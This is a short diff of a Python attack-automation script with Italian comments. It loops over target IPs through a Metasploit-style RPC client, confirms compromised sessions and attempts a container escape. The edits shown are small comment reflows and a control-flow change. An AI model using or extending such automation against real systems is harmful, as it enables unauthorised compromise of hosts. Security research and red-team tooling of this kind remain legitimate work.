@@ -54,6 +54,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
     mc=MetaClient("password", C.ATTACKER_SERVER_RPC_PORT, attacker_ip)
 
     while(machines):
+
         target_ip=machines.pop(0)
         print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
 
@@ -138,13 +139,11 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
             
             if(session):
                 
-                #poiché potrebbero avvenire dei falsi positivi di qualche attacco passato dobbiamo controllare che la sessione
-                #trvata sia quella della macchina bersaglio attuale, e non di una vecchia
+                #poiché potrebbero avvenire dei falsi positivi relativi a qualche attacco passato si controlla che la sessione trvoata sia quella della macchina bersaglio attuale, e non di una vecchia
                 if (session[0:1][0] == target_ip):
                 
                     atk_sess=session[1:2][0]["id_sess"]
-                    #TODO: Non essendo stato testato questo tipo di attacco tramite una sessione controllare che la funzione di attacco vada a buon fine
-                    #togliendo il commento nella riga sottostante
+                    #TODO: Non essendo stato testato questo tipo di attacco tramite una sessione controllare che la funzione di attacco vada a buon fine togliendo il commento nella riga sottostante
                     #OOBSession = atk_sess
                     #print(f"OOBSession: {OOBSession}")
                     print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
@@ -168,8 +167,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                         else:
                             print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
                             break  
-                    else:
-                        break 
+                    break 
                 else:
                     print(f"{C.COL_YELLOW}[*] false positive occurred, ignoring... {C.COL_RESET}")
                     
